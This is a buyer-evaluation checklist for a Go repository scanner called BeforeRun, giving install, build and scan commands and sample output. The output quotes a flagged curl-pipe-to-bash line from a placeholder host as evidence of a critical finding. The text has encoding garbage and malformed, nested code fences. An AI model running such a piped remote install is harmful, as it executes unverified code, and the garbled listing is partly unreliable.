# Buyer evaluation â€” Scan the current directory

## Goal

In 15â€“45 minutes, verify the Product builds or runs as documented and that proprietary notices are present.

## Steps

1. Confirm root `LICENSE` is proprietary and `ACQUISITION.md` exists.
2. Skim `README.md` install/run claims.
3. Execute:

```
```bash
go install github.com/theworker02/beforerun/cmd/beforerun@latest
```
```bash
git clone https://github.com/theworker02/beforerun.git
cd beforerun
go build -o beforerun ./cmd/beforerun
```
```bash
# Scan the current directory
beforerun scan .

# Block on medium-or-higher findings
beforerun scan . --fail-on medium

# Machine-readable output
beforerun scan ./untrusted-repo --format json

# Ignore organization-specific paths
beforerun scan . --ignore fixtures,third_party/cache

# Print the installed version
beforerun version
```
```text
BeforeRun BLOCK Ã¢â‚¬â€ risk 53/100 (HIGH)
Scanned 29 files (184.2 KiB) in /work/untrusted-repo
Findings: 1 critical, 1 high, 0 medium, 0 low | fail-on=high

[CRITICAL] BR004 scripts/install.sh:7
  remote content is piped directly into a command shell
  Evidence: curl https://example.invalid/install.sh | bash
  Fix: Download the content separately, verify its source and checksum, then inspect it before execution.
```
```bash
go get github.com/theworker02/beforerun
```
```go
package main

```

4. Run tests if present (`npm test`, `pytest`, `cargo test`, `go test ./...`, etc.).
5. Record README vs observed behavior gaps in workpapers.

## Pass criteria

- [ ] Clone succeeds
- [ ] Documented happy path works **or** failure is explained
- [ ] Minimal path needs no surprise secrets
- [ ] License notices intact

*Updated: 2026-09-22*
